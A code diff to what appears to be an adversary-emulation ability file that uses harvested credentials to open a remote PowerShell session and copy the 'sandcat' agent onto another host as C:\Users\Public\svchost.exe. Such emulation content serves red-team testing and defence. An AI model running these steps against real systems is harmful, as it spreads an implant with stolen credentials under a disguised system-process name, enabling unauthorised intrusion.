@@ -9,14 +9,17 @@
     name: Remote File Copy
   platforms:
     windows:
-      psh:
+      psh,pwsh:
         command: |
           $job = Start-Job -ScriptBlock {
-            $username = "#{host.user.name}";$password = "#{host.user.password}";$secstr = New-Object -TypeName System.Security.SecureString;
+            $username = "#{host.user.name}";
+            $password = "#{host.user.password}";
+            $secstr = New-Object -TypeName System.Security.SecureString;
             $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
             $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
             $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
             Copy-Item -Path "sandcat.go-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+            Start-Sleep -s 5;
             Remove-PSSession -Session $session;
           };
           Receive-Job -Job $job -Wait;
